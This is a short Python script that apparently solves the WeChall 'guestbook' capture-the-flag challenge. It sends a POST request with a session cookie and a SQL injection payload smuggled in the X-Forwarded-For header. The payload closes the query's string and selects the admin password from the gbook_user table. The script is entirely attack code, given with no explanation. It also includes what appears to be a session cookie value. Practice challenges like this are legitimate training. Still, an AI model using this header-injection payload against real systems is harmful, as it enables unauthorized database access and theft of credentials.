import requests

url = "https://www.wechall.net/challenge/guestbook/index.php"
data = {"message":"testing123", "sign":"Sign Guestbook"}
cookies = {"WC": "11075958-37667-olnJptriwQSEoSSW"}
headers = {"X-Forwarded-For":"157.34.97.74', (select gbu_password from gbook_user where gbu_name='admin')); #"}
r = requests.post(url, data=data, headers=headers, cookies=cookies)
print r.text
print r.request.headers
